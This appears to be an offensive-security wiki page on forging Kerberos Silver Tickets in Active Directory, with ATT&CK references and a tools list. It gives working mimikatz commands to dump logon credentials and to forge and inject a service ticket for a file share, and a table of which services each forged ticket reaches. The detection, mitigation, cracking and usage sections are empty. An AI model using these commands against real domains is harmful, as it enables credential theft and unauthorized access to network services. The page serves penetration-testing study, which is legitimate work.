---
description: >-
  A Kerberos Silver Ticket is another type of forged authentication ticket used
  in Kerberos-based authentication systems. Unlike a Golden Ticket, which grants
  full administrative access to a domain cont
---

# 🥈 Silver Ticket

<figure><img src="../.gitbook/assets/Silver Tickets.png" alt="Silver Ticket"><figcaption><p>Silver Ticket</p></figcaption></figure>

A Kerberos Silver Ticket is another type of forged authentication ticket used in Kerberos-based authentication systems. Unlike a Golden Ticket, which grants full administrative access to a domain controller, a Silver Ticket provides unauthorized access to a specific service or resource within the network.

Silver Tickets = Forged Ticket Granting Service (TGS) tickets

{% hint style="warning" %}
Silver Ticket – Requires service hash. Use for **persistence** and **escalation**
{% endhint %}

{% hint style="danger" %}
ATT\&CK® Tactic: [Credential Access](https://attack.mitre.org/tactics/TA0006/)

ATT\&CK Technique:[T1558.002](https://attack.mitre.org/techniques/T1558/002/)
{% endhint %}

{% hint style="info" %}
Tools:[mimikatz](https://github.com/gentilkiwi/mimikatz), [impacket](https://github.com/SecureAuthCorp/impacket), [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
{% endhint %}

### Learn the Theory Behind Silver Tickets Attacks

{% embed url="https://ad-attacks.com/silver-ticket-attack-explained/" %}

### Requirements to forge a Silver Ticket

Service hash required

<table data-full-width="false"><thead><tr><th>MimiKatz Parameter</th><th>Info</th><th>Example</th></tr></thead><tbody><tr><td>/domain</td><td>Domain</td><td>poplabsec.rfs</td></tr><tr><td>/sid</td><td>AD Domain SID</td><td></td></tr><tr><td>/user</td><td>User to create or impersonate</td><td></td></tr><tr><td>/target</td><td>FQDN from the server</td><td></td></tr><tr><td>/service</td><td>Service name to attack</td><td></td></tr><tr><td>/rc4</td><td>NTLM/RC4 hash</td><td></td></tr></tbody></table>

<details>

<summary>Step 1 - Get a Service or Computer account Password Hash</summary>

Invoke MimiKatz

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```

</details>

<details>

<summary>Step 2 - Crack NTLM Hash</summary>



</details>

<details>

<summary>Step 3 - Generate the Silver Ticket</summary>

Remember to select the user you want to impersonate or create a new one

{% code overflow="wrap" %}
```powershell
mimikatz.exe "kerberos::golden /user:NonExistentUser /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /rc4:8fbe632c51039f92c21bcef456b31f2b /target:FileServer1.domain.com /service:cifs /ptt" "misc::cmd" exit
```
{% endcode %}

</details>

<details>

<summary>Step 4 - Use the Forget Ticket</summary>

```
// Some code
```

</details>

<figure><img src="../.gitbook/assets/why-the-fuck-iflyto.jpg" alt=""><figcaption></figcaption></figure>

| Service Type              | Service Silver Ticket                                  |
| ------------------------- | ------------------------------------------------------ |
| WMI                       | HOST + RPCSS                                           |
| PSRemote                  | HOST + HTTP or WSMAN + RPCSS (Depending on OS version) |
| WinRM                     | HOST + HTTP                                            |
| Scheduled Tasks           | HOST                                                   |
| Windows File Share (CIFS) | CIFS                                                   |
| LDAP including DCSync     | LDAP                                                   |
| Windows RSAT              | RPCSS + LDAP + CIFS                                    |

### How to Create Golden Tickets with MimiKatz?

{% tabs %}
{% tab title="Detect" %}

{% endtab %}

{% tab title="Mitigate" %}

{% endtab %}
{% endtabs %}

**SERVICE SILVER TICKET**

### Documentation

{% file src="../.gitbook/assets/SIEGECAST-KERBEROS-AND-ATTACKS-101.pdf" %}
